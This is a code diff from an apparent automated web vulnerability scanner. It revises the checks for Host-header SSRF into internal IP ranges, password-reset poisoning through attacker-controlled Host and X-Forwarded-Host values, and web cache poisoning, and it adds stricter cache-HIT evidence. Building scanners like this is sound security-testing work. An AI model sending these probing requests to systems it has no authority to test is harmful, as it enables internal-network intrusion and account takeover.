-                base_res = self._host_raw_exchange([base_req], 1)
-                b_text = base_res[0]["body"] if base_res else ""
-                if self._host_admin(b_text):
-                    continue
-                for ih in ("192.168.0.1", "127.0.0.1", "localhost"):
-                    if 140 in self._confirmed or not self._within_budget():
-                        break
-                    raw = self._host_build_request(f"GET http://{ih}{apath} HTTP/1.1",
-                                                   [("Host", legit_host), ("Connection", "close")])
-                    res = self._host_raw_exchange([raw], 1)
-                    if not res:
-                        continue
-                    r = res[0]
-                    if r["status"] == 200 and self._host_admin(r["body"]) and r["body"] != b_text:
-                        self._host_mark(140, au,
-                                        f"SSRF via flawed request parsing terverifikasi: request line "
-                                        f"'GET http://{ih}{apath}' -> HTTP 200 dengan konten internal/admin.",
-                                        "host_header_ssrf_flawed_parsing")
-                        break
+                batch = internal_ips[offset:offset + 24]
+                with ThreadPoolExecutor(max_workers=12) as executor:
+                    futures = [
+                        executor.submit(probe_internal_host, internal_ip)
+                        for internal_ip in batch
+                    ]
+                    for future in as_completed(futures):
+                        try:
+                            internal_ip, response = future.result()
+                        except Exception:
+                            internal_ip, response = "", None
+                        if (
+                            response and response.get("status") == 200
+                            and self._host_admin(response.get("body", ""))
+                            and found_admin is None
+                        ):
+                            found_admin = (internal_ip, response)
+                        self.request_count += 1
+                        self.stats["requests"] = self.request_count
+                if found_admin:
+                    internal_ip, _response = found_admin
+                    self._host_mark(
+                        140, absolute_target,
+                        f"SSRF via flawed request parsing terverifikasi: absolute-form "
+                        f"request target {absolute_target!r} dengan Host {internal_ip} "
+                        f"mengembalikan konten admin internal HTTP 200.",
+                        "host_header_ssrf_flawed_parsing",
+                    )
+                    break
 
         # ---------- 141: Host validation bypass via connection state ----------
         if 141 not in self._confirmed and self._within_budget():
@@ -4401,9 +4800,8 @@ class SatriaBaruScanner:
             for ru, field in reset_targets:
                 if 136 in self._confirmed or not self._within_budget():
                     break
-                data = {field: "wiener"}
                 try:
-                    base = self._request("POST", ru, data=data, allow_redirects=True)
+                    base = self._host_reset_post(ru, field, pages)
                 except Exception:
                     continue
                 if base.error:
@@ -4416,14 +4814,14 @@ class SatriaBaruScanner:
                              {"X-Forwarded-Host": evil_host}):
                     if 136 in self._confirmed or not self._within_budget():
                         break
-                    probe = self._request("POST", ru, data=data, headers=hdrs, allow_redirects=True)
+                    probe = self._host_reset_post(ru, field, pages, headers=hdrs)
                     if probe.error:
                         continue
                     p_text = probe.text or ""
                     p_loc = str((probe.headers or {}).get("Location") or (probe.headers or {}).get("location") or "")
                     reflected = evil_host in (p_text + p_loc) and evil_host not in (b_text + b_loc)
                     if reflected and b_flow:
-                        second = self._request("POST", ru, data=data, headers=hdrs, allow_redirects=True)
+                        second = self._host_reset_post(ru, field, pages, headers=hdrs)
                         if not second.error and evil_host in ((second.text or "") +
                                                               str((second.headers or {}).get("Location") or "")):
                             self._host_mark(136, ru,
@@ -4450,13 +4848,27 @@ class SatriaBaruScanner:
                 if plain.error or tag not in (plain.text or ""):
                     continue
                 headers = {str(k).lower(): str(v).lower() for k, v in (plain.headers or {}).items()}
-                cache_signal = " ".join(headers.get(k, "") for k in
-                                        ("x-cache", "x-cache-status", "cf-cache-status", "age", "x-proxy-cache"))
-                if cache_signal.strip():
+                cache_evidence = []
+                for key in ("x-cache", "x-cache-status", "cf-cache-status", "x-proxy-cache", "x-varnish-cache"):
+                    if "hit" in headers.get(key, ""):
+                        cache_evidence.append(f"{key}={headers[key]}")
+                try:
+                    age = int(headers.get("age", "0") or 0)
+                    if age > 0:
+                        cache_evidence.append(f"age={age}")
+                except Exception:
+                    pass
+                try:
+                    hits = int(headers.get("x-cache-hits", "0") or 0)
+                    if hits > 0:
+                        cache_evidence.append(f"x-cache-hits={hits}")
+                except Exception:
+                    pass
+                if cache_evidence:
                     self._host_mark(138, base_url,
-                                    f"Web cache poisoning via ambiguous Host request terverifikasi pada "
-                                    f"{base_url}: nilai {host_val!r} tercemar pada respons ter-cache "
-                                    f"(cache={cache_signal.strip()[:70]!r}).",
+                                    f"Web cache poisoning via ambiguous Host request terverifikasi: "
+                                    f"canary {host_val!r} bertahan pada respons berikutnya dengan "
+                                    f"indikator cache HIT ({', '.join(cache_evidence)}).",
                                     "host_header_cache_poisoning_ambiguous")
                     break
 
@@ -4471,17 +4883,17 @@ class SatriaBaruScanner:
             for ru, field in reset_targets[:4]:
                 if 142 in self._confirmed or not self._within_budget():
                     break
-                data = {field: "wiener"}
-                base = self._request("POST", ru, data=data, allow_redirects=True)
+                base = self._host_reset_post(ru, field, pages)
                 if base.error:
                     continue
                 b_all = (base.text or "") + str((base.headers or {}).get("Location") or "")
                 for dh in dangling:
                     if 142 in self._confirmed or not self._within_budget():
                         break
-                    probe = self._request("POST", ru, data=data, headers={"Host": dh,
-                                                                         "X-Forwarded-Host": dh},
-                                          allow_redirects=True)
+                    probe = self._host_reset_post(
+                        ru, field, pages,
+                        headers={"Host": dh, "X-Forwarded-Host": dh},
+                    )
                     if probe.error:
                         continue
                     p_all = (probe.text or "") + str((probe.headers or {}).get("Location") or "")
